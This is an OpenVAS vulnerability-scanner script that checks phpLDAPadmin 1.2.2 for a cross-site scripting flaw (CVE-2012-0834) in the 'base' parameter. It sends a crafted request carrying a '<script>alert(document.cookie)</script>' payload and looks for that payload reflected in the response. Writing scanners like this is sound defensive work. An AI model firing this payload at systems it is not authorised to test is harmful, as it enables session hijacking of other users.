###############################################################################
# OpenVAS Vulnerability Test
#
# phpLDAPadmin 'base' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802602");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2012-0834");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-02-02 16:16:16 +0530 (Thu, 02 Feb 2012)");
  script_name("phpLDAPadmin 'base' Parameter Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47852/");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Feb/5");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109329/phpldapadmin-xss.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51793");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521450");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("phpldapadmin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the  context of an affected site.");

  script_tag(name:"affected", value:"phpLDAPadmin version 1.2.2 is known to be affected.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  to the 'base' parameter in 'cmd.php', which allows attackers to execute arbitrary HTML and script
  code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to phpLDAPadmin 1.2.3 or later.");

  script_tag(name:"summary", value:"phpLDAPadmin is prone to a cross-site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

req = http_get(item:dir + "/index.php", port:port);
res = http_keepalive_send_recv(port:port, data:req);

cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
if(isnull(cookie[1]))
  exit(0);

url = dir + "/cmd.php?cmd=query_engine&server_id=1&query=none&format=list&showresults=na&base=<script>alert(document.cookie)</script>&scope=sub&filter=objectClass%3D*&display_attrs=cn%2C+sn%2C+uid%2C+postalAddress%2C+telephoneNumber&orderby=&size_limit=50&search=Search";
req = http_get(item:url, port:port);
req = string(chomp(req), '\r\nCookie: ', cookie[1], '\r\n\r\n');
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script>" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
